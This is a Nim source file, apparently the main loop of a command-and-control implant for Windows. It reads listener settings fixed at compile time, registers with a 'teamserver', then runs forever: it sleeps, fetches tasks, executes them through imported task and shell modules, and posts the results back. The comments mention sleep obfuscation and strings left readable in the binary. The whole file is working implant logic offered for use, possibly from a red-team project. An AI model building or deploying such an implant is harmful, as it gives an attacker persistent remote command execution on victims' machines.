import strformat, os, times
import winim

import ./[types, http, task]
import commands/shell

const ListenerUuid {.strdefine.}: string = ""
const ListenerIp {.strdefine.}: string = ""
const ListenerPort {.intdefine.}: int = 5555
const SleepDelay {.intdefine.}: int = 10

proc main() = 

    #[
        The process is the following:
        1. Agent reads configuration file, which contains data relevant to the listener, such as IP, PORT, UUID and sleep settings
        2. Agent collects information relevant for the registration (using Windows API)
        3. Agent registers to the teamserver 
        4. Agent moves into an infinite loop, which is only exited when the agent is tasked to terminate
    ]#  

    # The agent configuration is read at compile time using define/-d statements in nim.cfg
    # This configuration file can be dynamically generated from the teamserver management interface
    # Downside to this is obviously that readable strings, such as the listener UUID can be found in the binary
    when not defined(ListenerUuid) or not defined(ListenerIp) or not defined(ListenerPort) or not defined(SleepDelay):
        echo "Missing agent configuration."
        quit(0)

    var config = AgentConfig(
        listener: ListenerUuid,
        ip: ListenerIp, 
        port: ListenerPort, 
        sleep: SleepDelay
    )

    let agent = config.register()
    echo fmt"[+] [{agent}] Agent registered."

    #[
        Agent routine: 
        1. Sleep Obfuscation
        2. Retrieve task from /tasks endpoint
        3. Execute task and post result to /results
        4. If additional tasks have been fetched, go to 2.
        5. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 

        sleep(config.sleep * 1000)

        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
        echo fmt"[{date}] Checking in."

        # Retrieve task queue from the teamserver for the current agent
        let tasks: seq[Task] = config.getTasks(agent)

        if tasks.len <= 0: 
            echo "[*] No tasks to execute."
            continue 
        
        # Execute all retrieved tasks and return their output to the server
        for task in tasks: 
            let result: TaskResult = task.handleTask(config)
            discard config.postResults(agent, result)
            
when isMainModule: 
    main() 